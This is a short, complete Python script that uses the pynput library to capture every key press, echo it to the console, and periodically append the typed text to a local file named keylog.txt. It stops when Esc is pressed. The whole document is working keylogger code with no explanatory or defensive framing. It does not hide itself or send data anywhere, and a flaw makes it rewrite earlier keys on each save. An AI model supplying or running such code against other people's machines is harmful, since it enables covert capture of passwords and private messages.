import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(key)
    if count >= 25:
        count = 0
        write_to_log(keys)


def write_to_log(keys):
    with open("keylog.txt", "a") as f:
        f.write("\n")
        for key in keys:
            k = str(key).replace("'", "")
            if key == Key.space:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
